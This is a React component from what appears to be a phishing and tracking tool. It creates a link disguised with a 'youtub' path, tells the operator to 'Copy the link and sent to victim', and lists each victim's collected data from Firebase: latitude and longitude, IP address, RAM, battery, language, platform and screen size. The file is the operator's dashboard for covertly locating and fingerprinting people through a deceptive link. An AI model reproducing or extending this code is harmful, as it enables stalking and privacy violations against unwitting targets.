import { useEffect, useState } from "react"
import { useParams } from "react-router-dom"
import { database } from "../../../DATABASE/Config";
import { onValue, ref } from "firebase/database";



const DeviceLink = () => {
  const {uid} = useParams()
  const [link, setLink] = useState(`${window.location.host}/youtub/${uid}`);
  const [copied, setCopied] = useState(false);
  const [data, setData] = useState([]);

  

  useEffect(() => {
     const dbRef = ref(database, `user/${uid}/victim/device/`);

     onValue(dbRef, (snapshot) => {
      const dataArray = [];
      snapshot.forEach((childSnapshot) => {
        dataArray.push(childSnapshot.val())
      });
      
      setData(dataArray)
     })
  },[uid])
  const copyToClipBoard = () => {
    navigator.clipboard.writeText(link)
    .then(() => setCopied(true))
  }

  return (
    <div>
      <div>
        <div>
          <div className="flex justify-center p-5">
          <div className="mr-5 flex flex-col items-center justify-center">
            <h1 className="p-2 font-bold">Copy the link and sent to victim</h1>
            <textarea value={link} className="h-10 w-96 border border-black rounded-xl overflow-hidden" />
          </div>
          <button onClick={copyToClipBoard} className="flex items-center justify-center border px-4 rounded-xl bg-blue-500 focus:bg-orange-600">{copied ? "Copied" : "Copy"}</button>
          </div>
        </div>
        <div className="flex flex-wrap m-2">
          {data.map((item, index) => {
            return <div key={index} className="flex m-2 ">
                <div className="border border-black w-100 p-3">
                <div>
                  Victim location
                  <div>
                    <p>Latitude : {item.latitude}</p>
                    <p>LongiTude : {item.longitude}</p>
                  </div>
                </div>
                <div>
                  <p>Ip address (ipv4) : {item.ip}</p>
                  <p>Device Ram : {item.deviceMemory} gb</p>
                  <p>{item.batteryLevel}</p>
                  <p>IsOnline : {item.isOnline}</p>
                  <p>Device Language : {item.language}</p>
                  <p>Color Depth : {item.colorDepth}</p>
                  <p>Hardware Concurrency {item.hardwareConcurrency}</p>
                  <p>Pixel Ratio : {item.pixelRatio}</p>
                  <p>Platform : {item.platform}</p>
                  <p>Screen height : {item.screenHeight}</p>
                  <p>Screen width: : {item.screenWidth}</p>
                </div>
                </div>
            </div>
          })}
        </div>
      </div>
    </div>
  )
}

export default DeviceLink